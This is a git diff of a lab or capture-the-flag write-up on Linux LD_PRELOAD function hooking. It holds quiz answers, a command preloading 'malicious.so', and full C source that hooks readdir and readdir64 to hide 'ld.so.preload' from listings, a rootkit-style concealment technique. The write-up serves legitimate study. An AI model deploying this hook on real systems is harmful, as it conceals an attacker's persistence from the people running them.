@@ -109,7 +109,7 @@ helloworld.c  malicious.c
 <p><em>Answer the questions below</em></p>
 
 <p>5.1. <em>When compiling our code to produce a Shared Object, which flag is used to create position independent code?</em><br>
-<code>d_ino</code></p>
+<code>-fPIC</code></p>
 
 <p>5.2. <em>Can hooking libc functions affect the behavior of Python3? (Yay/Nay)</em><br>
 <code>Yay</code></p>
@@ -126,6 +126,57 @@ first  helloworld.c  malicious.c  malicious.so
 
 ```bash
 :~/LinuxFunctionHooking# export LD_PRELOAD=$(pwd)/malicious.so
+```
+
+<img width="1300" height="422" alt="image" src="https://github.com/user-attachments/assets/0b4ba90f-c062-4253-a4ed-83999257c3c4" />
+
+
+<br>
+<h2>Task 6 . Hiding Files From Is</h2>
+
+<p><em>Answer the questions below</em></p>
+
+<p>6.1. <em>There are two mandatory fields of a dirent structure. One is d_name, and the other one is?</em><br>
+<code>d_ino</code></p>
+
+<p>6.2. <em>I have read and understood how I can hide files using shared objects!</em><br>
+<code>No answer needed</code></p>
+
+
+<p><em>Task 6... files</em></p>
+
+```bash
+#include <string.h>
+#include <stdlib.h>
+#include <dirent.h>
+#include <dlfcn.h>
+#include <fcntl.h>
+
+#define FILENAME "ld.so.preload"
+
+struct dirent *readdir(DIR *dirp)
+{
+     struct dirent *(*old_readdir)(DIR *dir);     
+     old_readdir = dlsym(RTLD_NEXT, "readdir");
+     struct dirent *dir;
+     while (dir = old_readdir(dirp))
+     {
+           if(strstr(dir->d_name,FILENAME) == 0) break;     
+     }
+     return dir;
+}
+
+struct dirent64 *readdir64(DIR *dirp)
+{
+     struct dirent64 *(*old_readdir64)(DIR *dir);     
+     old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
+     struct dirent64 *dir;
+     while (dir = old_readdir64(dirp))
+     {
+           if(strstr(dir->d_name,FILENAME) == 0) break;
+     }
+     return dir;
+}
 ```
 
 
